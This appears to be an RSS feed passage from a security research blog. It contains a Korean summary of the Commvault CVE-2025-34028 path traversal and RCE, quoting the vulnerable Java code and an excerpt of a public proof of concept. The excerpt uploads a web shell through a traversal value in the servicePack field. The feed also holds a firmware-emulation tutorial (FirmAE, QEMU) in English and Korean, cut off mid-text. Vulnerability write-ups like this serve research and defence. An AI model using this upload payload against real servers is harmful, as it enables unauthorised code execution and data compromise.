<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>hackyboiz</title>
    <link>https://hackyboiz.github.io/</link>
    
    <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>hack &amp; life</description>
    <pubDate>Sat, 10 May 2025 08:49:32 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[하루한줄] CVE-2025-34028: Commvault Path Traversal 통한 Remote Code Execution 취약점</title>
      <link>https://hackyboiz.github.io/2025/05/10/mungsul/2025-05-10/</link>
      <guid>https://hackyboiz.github.io/2025/05/10/mungsul/2025-05-10/</guid>
      <pubDate>Sat, 10 May 2025 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://labs.watchtowr.com/fire-in-the-hole-were-br</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://labs.watchtowr.com/fire-in-the-hole-were-breaching-the-vault-commvault-remote-code-execution-cve-2025-34028/">https://labs.watchtowr.com/fire-in-the-hole-were-breaching-the-vault-commvault-remote-code-execution-cve-2025-34028/</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Commvault 11.38.0 &#x2013; 11.38.19</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xB370;&#xC774;&#xD130; &#xBC31;&#xC5C5; &#xC194;&#xB8E8;&#xC158;&#xC778; Commvault &#xC5D0;&#xC11C; Remote Code Execution &#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740;  <code>deployWebpackage.do</code> &#xC640; <code>deployServiceCommcell.do</code> &#xB450; &#xACF3;&#xC5D0;&#xC11C; &#xD2B8;&#xB9AC;&#xAC70; &#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>deployWebpackage.do</code> &#xB85C; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xBA74; &#xC678;&#xBD80; &#xC11C;&#xBC84;&#xC5D0;&#xC11C; zip &#xD30C;&#xC77C;&#xC744; &#xAC16;&#xACE0; &#xC624;&#xACE0; <code>deployServiceCommcell.do</code> &#xB294; zip &#xD30C;&#xC77C;&#xC744; &#xBC14;&#xB85C; &#xC5C5;&#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB450; &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8; &#xBAA8;&#xB450; <code>deployCCPackage</code> &#xBA54;&#xC18C;&#xB4DC;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294;&#xB370;&#xC694;. &#xC5EC;&#xAE30;&#xC5D0;&#xC11C; <code>servicePack</code> &#xD30C;&#xB77C;&#xBA54;&#xD130;&#xC5D0; &#xAC80;&#xC99D;&#xC774; &#xC5C6;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC555;&#xCD95;&#xC744; &#xD480; &#xB54C; &#xC0C1;&#xC704; &#xB514;&#xB809;&#xD1A0;&#xB9AC; &#xC811;&#xADFC;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">deployCCPackage</span><span class="hljs-params">(String servicePack)</span> <span class="hljs-keyword">throws</span> IOException </span>{       String BASE_PATH = <span class="hljs-keyword">this</span>.extractPath(<span class="hljs-keyword">this</span>.fileZipUtil.getResourcePath(<span class="hljs-string">&quot;&quot;</span>), <span class="hljs-keyword">false</span>);       String CC_DEPLOY_PATH = BASE_PATH + File.separator + <span class="hljs-string">&quot;Apache&quot;</span> + File.separator + <span class="hljs-string">&quot;conf&quot;</span> + File.separator + <span class="hljs-string">&quot;ccPackages&quot;</span> + File.separator;       String DIST_CC_PATH = BASE_PATH + File.separator + <span class="hljs-string">&quot;AdminConsole&quot;</span> + File.separator + <span class="hljs-string">&quot;dist-cc-sps&quot;</span> + File.separator;       String TEMP_DIR = servicePack + <span class="hljs-string">&quot;.tmp&quot;</span> + File.separator + <span class="hljs-string">&quot;dist-cc&quot;</span>;       String SERVICEPACK_DEPLOY_PATH = DIST_CC_PATH + servicePack + <span class="hljs-string">&quot;.tmp&quot;</span>;        File dir = <span class="hljs-keyword">new</span> File(SERVICEPACK_DEPLOY_PATH);       <span class="hljs-keyword">if</span> (dir.exists()) {           FileUtils.deleteDirectory(dir);       }   <span class="hljs-keyword">this</span>.fileZipUtil.unzipFileWrtAbsPath(CC_DEPLOY_PATH + servicePack + File.separator + <span class="hljs-string">&quot;dist-cc.zip&quot;</span>, DIST_CC_PATH + TEMP_DIR);</code></pre><p>PoC &#xCF54;&#xB4DC;&#xC758; &#xC77C;&#xBD80;&#xB97C; &#xBCF4;&#xBA74; &#xC6F9; &#xC11C;&#xBC84;&#xC5D0;&#xC11C; &#xC811;&#xADFC; &#xAC00;&#xB2A5;&#xD55C; <code>/Reports/MetricsUpload/</code> &#xCABD;&#xC744; &#xB300;&#xC0C1;&#xC73C;&#xB85C; servicePack &#xBCC0;&#xC218;&#xB97C; &#xC138;&#xD305;[1]&#xD574;&#xC11C; &#xC6F9;&#xC258; &#xC5C5;&#xB85C;&#xB4DC;&#xB97C; &#xC2DC;&#xD0A4;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs java">...random_path = <span class="hljs-string">&apos;&apos;</span>.join(random.choice(string.ascii_letters + string.digits) <span class="hljs-function"><span class="hljs-keyword">for</span> _ in <span class="hljs-title">range</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>)</span><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(f<span class="hljs-string">&quot;[*] Uploading to  /reports/MetricsUpload/{random_path}/&quot;</span>)</span></span><span class="hljs-function">upload_url </span>= f<span class="hljs-string">&quot;{args.url}/commandcenter/deployServiceCommcell.do&quot;</span>upload_headers = {<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;CommvaultRCEPoC&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;*/*&quot;</span>}upload_form = {         &apos;servicePack&apos;: (None, f&apos;/../../../Reports/MetricsUpload/{random_path}/&apos;, &apos;text/plain&apos;), # [1]        <span class="hljs-string">&apos;version&apos;</span>: (None, <span class="hljs-string">&apos;12.45&apos;</span>, <span class="hljs-string">&apos;text/plain&apos;</span>),        <span class="hljs-string">&apos;file&apos;</span>: (<span class="hljs-string">&apos;file.zip&apos;</span>, shell, <span class="hljs-string">&apos;application/octet-stream&apos;</span>)}requests.post(upload_url, headers=upload_headers, files=upload_form, verify=False)shell_url = f<span class="hljs-string">&quot;{args.url}/reports/MetricsUpload/{random_path}/.tmp/dist-cc/dist-cc/shell.jsp&quot;</span>...</code></pre><p>&#xCC38;&#xACE0;&#xC790;&#xB8CC;&#xC5D0; &#xB530;&#xB974;&#xBA74; &#xC2EC;&#xC9C0;&#xC5B4; &#xC774; &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xB4E4;&#xC740; &#xC778;&#xC99D;&#xC744; &#xC218;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; preauth &#xB85C;&#xB3C4; &#xD2B8;&#xB9AC;&#xAC70;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xD574;&#xB2F9; &#xC194;&#xB8E8;&#xC158;&#xC740; SaaS &#xB85C;&#xB3C4; &#xC81C;&#xACF5;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC678;&#xBD80;&#xB85C; &#xC624;&#xD508;&#xB418;&#xC5B4; &#xC788;&#xB2E4;&#xBA74; RCE &#xB85C; &#xC778;&#xD574; &#xAD8C;&#xD55C;&#xC774; &#xD0C8;&#xCDE8;&#xB2F9;&#xD558;&#xACE0; &#xBC31;&#xC5C5;&#xB41C; &#xB370;&#xC774;&#xD130;&#xB4E4; &#xAE4C;&#xC9C0;&#xB3C4; &#xC601;&#xD5A5;&#xC744; &#xBBF8;&#xCE60; &#xC218; &#xC788;&#xC5B4; &#xD30C;&#xAE09;&#xB825;&#xC774; &#xB192;&#xC544;&#xBCF4;&#xC774;&#xB124;&#xC694;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><p><a href="https://labs.watchtowr.com/fire-in-the-hole-were-breaching-the-vault-commvault-remote-code-execution-cve-2025-34028/">https://labs.watchtowr.com/fire-in-the-hole-were-breaching-the-vault-commvault-remote-code-execution-cve-2025-34028/</a></p></li><li><p><a href="https://github.com/watchtowrlabs/watchTowr-vs-Commvault-PreAuth-RCE-CVE-2025-34028/blob/main/watchtowr-vs-commvault-rce-CVE-2025-34028.py">https://github.com/watchtowrlabs/watchTowr-vs-Commvault-PreAuth-RCE-CVE-2025-34028/blob/main/watchtowr-vs-commvault-rce-CVE-2025-34028.py</a></p></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Remote-Code-Execution/">Remote Code Execution</category>
      
      <category domain="https://hackyboiz.github.io/tags/Path-Traversal/">Path Traversal</category>
      
      <category domain="https://hackyboiz.github.io/tags/mungsul/">mungsul</category>
      
      <category domain="https://hackyboiz.github.io/tags/Commvault/">Commvault</category>
      
      
      <comments>https://hackyboiz.github.io/2025/05/10/mungsul/2025-05-10/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Firmware Emulation with FirmAE Part 1 (en)</title>
      <link>https://hackyboiz.github.io/2025/05/08/newp1ayer48/emulation1/en/</link>
      <guid>https://hackyboiz.github.io/2025/05/08/newp1ayer48/emulation1/en/</guid>
      <pubDate>Thu, 08 May 2025 14:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;Hello! I&amp;#x2019;m newp1ayer48, the one in charge of the low-level at Hackyboiz! &amp;#x1F938;&amp;#x1F3FB;&amp;#x200D;&amp;#x2642;&amp;#xFE0F;&lt;/p&gt;
&lt;p&gt;In the </description>
        
      
      
      
      <content:encoded><![CDATA[<p>Hello! I&#x2019;m newp1ayer48, the one in charge of the low-level at Hackyboiz! &#x1F938;&#x1F3FB;&#x200D;&#x2642;&#xFE0F;</p><p>In the previous post, I said I&#x2019;d return to debugging port connections, but due to budget constraints, I&#x2019;m back with a different topic! (E<del>mbedded hacking is all about pay-to-win&#x2026;</del>&#x1F4B8;)</p><p>Once you&#x2019;ve acquired the firmware and examined the file system, it&#x2019;s time to dive into the fun part&#x2014;analyzing it for vulnerabilities.</p><p>But&#x2026; relying solely on static analysis to find vulnerabilities is hardly an ideal situation. Even in pwnable challenges we use GDB, so how long are we just going to stare at IDA? &#x1F620;</p><p>That&#x2019;s why humans have always found a way. The answer is emulation!</p><p><img src="image01.jpg" alt="image01.jpg"></p><h2 id="1-Simulation-vs-Emulation"><a href="#1-Simulation-vs-Emulation" class="headerlink" title="1. Simulation vs Emulation"></a>1. Simulation vs Emulation</h2><p>Since the processes of building simulations and emulations can be quite similar, it&#x2019;s easy to confuse the two. But the biggest difference lies in their goals.</p><p>The main purpose of <strong>simulation</strong> is to test whether a program or system behaves correctly in a certain environment or scenario, often as a form of rehearsal. Rather than fully replicating the entire environment, simulations may only implement the minimum necessary parts and skip detailed functions. Sometimes, real hardware is used in the setup.</p><p>To put it simply, think of simulator games! These often don&#x2019;t replicate every feature perfectly, but their main purpose is to provide an experience or allow practice. &#x1F579;&#xFE0F;</p><p><img src="image02.webp" alt="image02.webp"></p><p><strong>Emulation</strong>, on the other hand, focuses on running a program or system in a different environment. Since the original hardware setup may be unavailable, it&#x2019;s important to mimic the hardware in software. The goal is often to make every function work as it would on the real system, so most emulations aim to replicate everything in detail.</p><p>You can think of emulation like Nintendo or Android emulators! Their main purpose is to let you run games or apps in a PC environment, so they&#x2019;re designed to support all the functions of those systems. &#x1F4F1;</p><p><img src="image03.png" alt="image03.png"></p><p>To summarize, the image below (not shown here) illustrates the key difference well.</p><p><img src="image04.jpg" alt="image04.jpg"></p><p>Back to embedded hacking&#x2014;our main goal is to perform <strong>dynamic analysis</strong> of the firmware we&#x2019;ve obtained. Embedded devices rely heavily on various sensors and hardware, so if the required hardware dependencies aren&#x2019;t met, they often won&#x2019;t function. Also, embedded systems typically use RISC architectures like ARM or MIPS, which means we have to emulate them in environments different from our typical CISC-based analysis systems. And since we want to dynamically analyze all the device&#x2019;s functions, nearly every feature must be executable. &#x1F477;&#x1F3FB;</p><p>Therefore, we need to view the firmware from an emulation perspective and build the appropriate environment. The prevalence of articles in embedded hacking that involve firmware emulation supports this approach!</p><h2 id="2-Firmware-Analysis"><a href="#2-Firmware-Analysis" class="headerlink" title="2. Firmware Analysis"></a>2. Firmware Analysis</h2><p>To emulate firmware, the first step is to analyze the environment in which it was built and is supposed to run. &#x261D;&#x1F3FB;</p><p><img src="image05.jpg" alt="image05.jpg"></p><p>With <code>binwalk</code>, you can extract several key pieces of information from firmware:</p><ul><li>Architecture</li><li>Kernel</li><li>Root File System</li></ul><p>Using binwalk, you can discover the architecture and kernel details of a sample firmware.</p><pre><code class="hljs bash">binwalk firmware.bin</code></pre><p><img src="image06.png" alt="image06.png"></p><p>The <code>-A</code> option provides more detailed architecture info. &#x1F50D;</p><p>The <code>-e</code> option extracts files from the identified sections.</p><p>The files extracted by binwalk often have numeric names, which correspond to the different regions of the firmware. By checking the addresses listed by binwalk, you can identify what each file is.</p><pre><code class="hljs bash">binwalk -e firmware.binbinwalk -A kernel</code></pre><p><img src="image07.png" alt="image07.png"></p><p>Embedded systems commonly use RISC architectures like ARM and MIPS. However, even within these, naming can differ depending on the endianness. &#x1F95A;</p><p>For example, <code>mips</code> typically uses big-endian, while <code>mipsel</code> uses little-endian. Binwalk usually detects and displays the architecture correctly, so just keep an eye on that.</p><h2 id="3-QEMU"><a href="#3-QEMU" class="headerlink" title="3. QEMU"></a>3. QEMU</h2><p>Once you&#x2019;ve identified the firmware&#x2019;s details, it&#x2019;s time to emulate it. Firmware can be run on a QEMU virtual machine. &#x1F4A8;</p><p><img src="image08.jpg" alt="image08.jpg"></p><p>QEMU is a virtualization tool frequently used to quickly set up emulation environments. You can specify kernel, image files, and other options. It&#x2019;s installable via <code>apt</code>.</p><p>In the case of router firmware, there often aren&#x2019;t many extra hardware or sensor dependencies beyond the firmware itself. So, if the kernel and image are configured correctly, the firmware can be run right away.</p><p>You can download architecture-specific files via the links provided (not shown here). &#x1F4BE;</p><p><a href="https://people.debian.org/~aurel32/qemu/">https://people.debian.org/~aurel32/qemu/</a></p><p>If you manually match the necessary files and set up the network, you&#x2019;ll be able to access the router&#x2019;s interface like below and use most of the functionality present in the root file system. &#x1F310;</p><p><img src="image09.jpg" alt="image09.jpg"></p><p>source: Bach`s Blog</p><h2 id="4-FirmAE"><a href="#4-FirmAE" class="headerlink" title="4. FirmAE"></a>4. FirmAE</h2><p>QEMU requires manual setup for networking and file configurations, which can be cumbersome.</p><p>But once again, humans found a way! There&#x2019;s a tool that simplifies emulation&#x2026;</p><p>And that tool is the main subject of this post: <strong>FirmAE</strong>! &#x1F941;</p><p><a href="https://github.com/pr0v3rbs/FirmAE">https://github.com/pr0v3rbs/FirmAE</a></p><p><img src="image10.png" alt="image10.png"></p><p>FirmAE is a firmware emulation automation tool developed by KAIST SysSec Lab. The research team created it to simplify the emulation of router and IP camera firmware images. It&#x2019;s built on QEMU and Binwalk. &#x1F528;</p><p>You can install and run it via GitHub.</p><pre><code class="hljs bash"><span class="hljs-comment"># download</span>sudo apt-get install -y bc fdisk qemu qemu-system-mips64 python3-psycopg2git <span class="hljs-built_in">clone</span> --recursive https://github.com/pr0v3rbs/FirmAE<span class="hljs-built_in">cd</span> ./FirmAE./download.sh./install.sh./init.sh<span class="hljs-comment"># firmware in FirmAE/firmwares </span>sudo ./run.sh -c VENDOR ./firmwares/sudo ./run.sh -d VENDOR ./firmwares/</code></pre><p>When you emulate a sample router firmware using FirmAE, you can access the router&#x2019;s web page just like before! The emulation process can take a fair bit of time, so be patient&#x2014;it typically takes around 20&#x2013;30 minutes (!). &#x2615;</p><p><img src="image11.png" alt="image11.png"></p><p>However, as indicated in the options, FirmAE was developed based on models from well-known router and IP camera manufacturers tested by the research team. As a result, it may not work well with less common devices or other embedded/IoT products. It also offers <code>gdbserver</code> functionality, but this often doesn&#x2019;t work reliably either. &#x1F972;</p><p><img src="image12.jpg" alt="image12.jpg"></p><p>In <strong>Part 2</strong>, I&#x2019;ll explore FirmAE&#x2019;s internal structure and how it works, and show how to emulate firmware in different environments and use the various features it provides effectively! &#x1F919;&#x1F3FB;</p><p>Thanks for reading!</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/firmware/">firmware</category>
      
      <category domain="https://hackyboiz.github.io/tags/newp1ayer48/">newp1ayer48</category>
      
      <category domain="https://hackyboiz.github.io/tags/Embedded/">Embedded</category>
      
      <category domain="https://hackyboiz.github.io/tags/Emulation/">Emulation</category>
      
      
      <comments>https://hackyboiz.github.io/2025/05/08/newp1ayer48/emulation1/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Firmware Emulation with FirmAE Part 1 (ko)</title>
      <link>https://hackyboiz.github.io/2025/05/08/newp1ayer48/emulation1/ko/</link>
      <guid>https://hackyboiz.github.io/2025/05/08/newp1ayer48/emulation1/ko/</guid>
      <pubDate>Thu, 08 May 2025 14:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;! Hackyboiz&amp;#xC5D0;&amp;#xC11C; &amp;#xAC00;&amp;#xC7A5; &amp;#xB0AE;&amp;#xC740; &amp;#xACF3;(low-level)&amp;#xC744; &amp;#xB9E1</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! Hackyboiz&#xC5D0;&#xC11C; &#xAC00;&#xC7A5; &#xB0AE;&#xC740; &#xACF3;(low-level)&#xC744; &#xB9E1;&#xACE0; &#xC788;&#xB294; <code>newp1ayer48</code> &#xC785;&#xB2C8;&#xB2E4;! &#x1F938;&#x1F3FB;&#x200D;&#x2642;&#xFE0F;</p><p>&#xC774;&#xC804; &#xAE00;&#xC5D0;&#xC11C; &#xB514;&#xBC84;&#xAE45; &#xD3EC;&#xD2B8; &#xC5F0;&#xACB0;&#xB85C; &#xB3CC;&#xC544;&#xC624;&#xAE30;&#xB85C; &#xD588;&#xC9C0;&#xB9CC;, &#xAE08;&#xC804; &#xC774;&#xC288;&#xB85C; &#xC778;&#xD574; &#xB2E4;&#xB978; &#xC8FC;&#xC81C;&#xB85C; &#xB3CC;&#xC544;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;! (<del>&#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xD574;&#xD0B9;&#xC740; &#xD604;&#xC9C8; &#xBE68;&#x2026;</del>&#x1F4B8;)</p><p>&#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xD68D;&#xB4DD;&#xD558;&#xACE0; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xAE4C;&#xC9C0; &#xD655;&#xC778;&#xD588;&#xC73C;&#xBA74; &#xC774;&#xC81C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xAE30; &#xC704;&#xD574; &#xC990;&#xAC70;&#xC6B4; &#xBD84;&#xC11D;&#xC744; &#xD560; &#xCC28;&#xB840;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7EC;&#xB098;&#x2026; &#xC815;&#xC801; &#xBD84;&#xC11D;&#xC73C;&#xB85C;&#xB9CC; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xB294;&#xB2E4;&#xB294; &#xAC83;&#xC740; &#xC369; &#xC720;&#xCF8C;&#xD55C; &#xC0C1;&#xD669;&#xC740; &#xC544;&#xB2C8;&#xC8E0;. &#xD3EC;&#xB108;&#xBE14;&#xD560; &#xB54C;&#xB3C4; gdb&#xB294; &#xBCF4;&#xB294;&#xB370;, &#xC5B8;&#xC81C;&#xAE4C;&#xC9C0; IDA&#xB9CC; &#xCCD0;&#xB2E4;&#xBCF4;&#xACE0; &#xC788;&#xC744; &#xAC81;&#xB2C8;&#xAE4C;.. &#x1F620;</p><p>&#xADF8;&#xB807;&#xAE30;&#xC5D0; &#xC778;&#xAC04;&#xC740; &#xC5B8;&#xC81C;&#xB098; &#xBC29;&#xBC95;&#xC744; &#xB9CC;&#xB4E4;&#xC5B4; &#xB193;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBC14;&#xB85C; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD305;&#xC774;&#xC8E0;!</p><p><img src="image01.jpg" alt="image01.jpg"></p><h2 id="1-&#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;-Simulation-vs-&#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158;-Emulation"><a href="#1-&#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;-Simulation-vs-&#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158;-Emulation" class="headerlink" title="1. &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;(Simulation) vs &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158;(Emulation)"></a>1. &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;(<strong>Simulation</strong>) vs &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158;(Emulation)</h2><p>&#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xACFC; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC740; &#xAD6C;&#xCD95; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBE44;&#xC2B7;&#xD55C; &#xBD80;&#xBD84;&#xC774; &#xB9CE;&#xC774; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xAC04;&#xD639; &#xAD6C;&#xBD84;&#xC774; &#xC5B4;&#xB824;&#xC6B8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC00;&#xC7A5; &#xD070; &#xCC28;&#xC774;&#xC810;&#xC740; &#xD558;&#xACE0;&#xC790; &#xD558;&#xB294; &#xBAA9;&#xD45C;&#xC5D0;&#xC11C; &#xB098;&#xB269;&#xB2C8;&#xB2E4;.</p><p>&#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC758; &#xC8FC; &#xBAA9;&#xC801;&#xC740; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xB610;&#xB294; &#xC2DC;&#xC2A4;&#xD15C;&#xC774; &#xD574;&#xB2F9; &#xD658;&#xACBD;&#xC774;&#xB098; &#xC0C1;&#xD669;&#xC5D0;&#xC11C; &#xAE30;&#xBCF8;/&#xD2B9;&#xC815; &#xB3D9;&#xC791;&#xC774; &#xAC00;&#xB2A5;&#xD55C;&#xC9C0;, &#xC608;&#xD589; &#xC5F0;&#xC2B5;&#xC744; &#xC704;&#xD574; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xD574;&#xBCF4;&#xB294; &#xC131;&#xACA9;&#xC774; &#xAC15;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; &#xC885;&#xC885; &#xBAA8;&#xB4E0; &#xD658;&#xACBD;&#xACFC; &#xC0C1;&#xD669;&#xC744; &#xAD6C;&#xCD95;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC544;&#xB2CC;, &#xD544;&#xC218; &#xB3D9;&#xC791;&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xCD5C;&#xC18C;&#xD55C;&#xB9CC; &#xAD6C;&#xCD95;&#xD558;&#xACE0; &#xC138;&#xBD80; &#xAE30;&#xB2A5;&#xAE4C;&#xC9C0;&#xB294; &#xAD6C;&#xD604;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xD658;&#xACBD; &#xAD6C;&#xC131; &#xC2DC;, &#xC2E4;&#xC81C; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4;&#xB85C; &#xD658;&#xACBD;&#xC744; &#xB9DE;&#xCD94;&#xB294; &#xACBD;&#xC6B0;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC27D;&#xAC8C; &#xBE44;&#xC720;&#xD558;&#xC790;&#xBA74;, &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC740; &#xB2E4;&#xC591;&#xD55C; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xD130; &#xAC8C;&#xC784;&#xC744; &#xC0DD;&#xAC01;&#xD558;&#xBA74; &#xC88B;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xD130; &#xAC8C;&#xC784;&#xC5D0;&#xC11C;&#xB294; &#xBAA8;&#xB4E0; &#xAE30;&#xB2A5;&#xC744; &#xC644;&#xBCBD;&#xD558;&#xAC8C; &#xC77C;&#xCE58; &#xC2DC;&#xCF1C; &#xAD6C;&#xD604;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xACBD;&#xC6B0;&#xB3C4; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xD130;&#xB294; &#xD55C; &#xBC88; &#xACBD;&#xD5D8;&#xD558;&#xACE0; &#xC5F0;&#xC2B5;&#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xC774; &#xC8FC;&#xBAA9;&#xC801;&#xC73C;&#xB85C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC838; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#x1F579;&#xFE0F;</p><p><img src="image02.webp" alt="image02.webp"></p><p>&#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC758; &#xC8FC; &#xBAA9;&#xC801;&#xC740; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xB610;&#xB294; &#xC2DC;&#xC2A4;&#xD15C;&#xC774; &#xB2E4;&#xB978; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xAD6C;&#xB3D9; &#xC2DC;&#xD0A4;&#xB824;&#xB294; &#xC131;&#xACA9;&#xC774; &#xAC15;&#xD569;&#xB2C8;&#xB2E4;. &#xAE30;&#xC874; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4; &#xC7A5;&#xBE44;&#xC640; &#xCCB4;&#xACC4;&#xAC00; &#xAC16;&#xCD94;&#xC9C0; &#xBABB;&#xD55C; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; &#xB3D9;&#xC791; &#xC2DC;&#xD0A4;&#xB824;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xD558;&#xB4DC;&#xC6E8;&#xC5B4; &#xC791;&#xC5C5; &#xC5ED;&#xC2DC; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB85C; &#xBAA8;&#xBC29;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC911;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C;, &#xB300;&#xBD80;&#xBD84;&#xC758; &#xC138;&#xBD80; &#xAE30;&#xB2A5;&#xAE4C;&#xC9C0; &#xC0AC;&#xC6A9;&#xD558;&#xB824;&#xB294; &#xAC83; &#xC5ED;&#xC2DC; &#xC8FC;&#xBAA9;&#xC801;&#xC774;&#xBBC0;&#xB85C; &#xAC70;&#xC758; &#xBAA8;&#xB4E0; &#xAE30;&#xB2A5;&#xC744; &#xAD6C;&#xD604;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC740; &#xB2CC;&#xD150;&#xB3C4;/&#xC548;&#xB4DC;&#xB85C;&#xC774;&#xB4DC; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD130;&#xB97C; &#xC0DD;&#xAC01;&#xD558;&#xC2DC;&#xBA74; &#xD3B8;&#xD569;&#xB2C8;&#xB2E4;! &#xB2CC;&#xD150;&#xB3C4;/&#xC548;&#xB4DC;&#xB85C;&#xC774;&#xB4DC;&#xC758; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD130;&#xC758; &#xC8FC;&#xBAA9;&#xC801;&#xC740; PC 